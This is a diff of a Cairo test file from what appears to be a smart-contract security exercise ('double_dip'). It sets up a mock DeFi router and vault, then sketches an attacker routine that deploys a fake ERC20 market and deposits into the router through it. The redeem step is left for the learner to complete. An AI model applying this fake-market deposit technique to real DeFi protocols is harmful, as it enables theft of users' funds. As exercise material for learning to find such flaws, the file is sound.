@@ -12,42 +12,63 @@ mod TestDoubleDip {
         IERC20CamelSafeDispatcher, IERC20CamelSafeDispatcherTrait
     };
     use pharaonik::interfaces::ISubDefiRouter::{
-        ISubDefiRouterDispatcher, ISubDefiRouterDispatcherTrait
+        ISubDefiRouterSafeDispatcher, ISubDefiRouterSafeDispatcherTrait
+    };
+    use pharaonik::interfaces::ISubDefiVault::{
+        ISubDefiVaultSafeDispatcher, ISubDefiVaultSafeDispatcherTrait
     };
     use pharaonik::excercises::excercise0::double_dip::attack::{
         IAttackSafeDispatcher, IAttackSafeDispatcherTrait
     };
     use pharaonik::utils::constants::Constants;
     use pharaonik::utils::errors::Errors;
-    use pharaonik::setup::setup::Setup::{declare_contract, deploy_contract};
+    use pharaonik::setup::setup::Setup::{declare_contract, deploy_contract, fund_tokens};
     use pharaonik::setup::setup_double_dip::SetupDoubleDip::{setup_double_dip};
 
     #[test]
     #[feature("safe_dispatcher")]
     fn test_exploit() {
-        // Alice deposit action
         let (wETH_address, router_address, eth_vault_address) = setup_double_dip();
         let wETH = IERC20CamelSafeDispatcher { contract_address: wETH_address };
-        let SubDefiRouter = ISubDefiRouter { contract_address: router_address };
+        let SubDefiRouter = ISubDefiRouterSafeDispatcher { contract_address: router_address };
+        let SubDefiEthVault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault_address };
+        let sub_defi_admin = Constants::sub_defi_admin();
 
-        // Attack setup
+        start_prank(CheatTarget::One(router_address), sub_defi_admin);
+        SubDefiRouter.add_market(wETH_address, eth_vault_address).unwrap();
+        stop_prank(CheatTarget::One(router_address));
+
+        start_prank(CheatTarget::One(eth_vault_address), sub_defi_admin);
+        SubDefiEthVault.update_rate(1000000000000000000).unwrap();
+        stop_prank(CheatTarget::One(eth_vault_address));
+
+        attack_action(router_address, wETH_address);
+        'Excerise Completed!'.print();
+    }
+
+    // Complete the below function 
+    fn attack_action(router: ContractAddress, wETH: ContractAddress) {
+        let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
         let attacker = Constants::attacker();
-        let deposit_amount: u256 = 5000000000000000000; // 5 ETH
-
-        start_prank(CheatTarget::One(wETH_address), attacker);
-        let success = wETH.approve(eth_vault_address, deposit_amount).unwrap();
-        assert(success, Errors::APPROVAL_FAILED);
-        stop_prank(CheatTarget::One(wETH_address));
-
+        let Router = ISubDefiRouterSafeDispatcher { contract_address: router };
         let market_id: u32 = 0;
 
-        start_prank(CheatTarget::One(router_address), attacker);
-        let deposit_id: u8 = SubDefiRouter
-            .deposit_request(market_id, market, deposit_amount)
-            .unwrap();
-        stop_prank(CheatTarget::One(trove_address));
+        // Deploy false wETH Market contract
+        let mut call_data = ArrayTrait::new();
+        call_data.append(contract_address_to_felt252(attacker));
+        let false_market_class: ContractClass = declare_contract('FalseERC20');
+        let false_market_address: ContractAddress = deploy_contract(false_market_class, call_data);
 
-        'Excerise Completed!'.print();
+        IERC20CamelSafeDispatcher { contract_address: wETH }
+            .transfer(false_market_address, deposit_amount);
+
+        // Deposit
+        start_prank(CheatTarget::One(router), attacker);
+        let deposit_id: u8 = Router
+            .deposit_request(market_id, false_market_address, deposit_amount)
+            .unwrap();
+        stop_prank(CheatTarget::One(router));
+    // Redeem
     }
 }
 
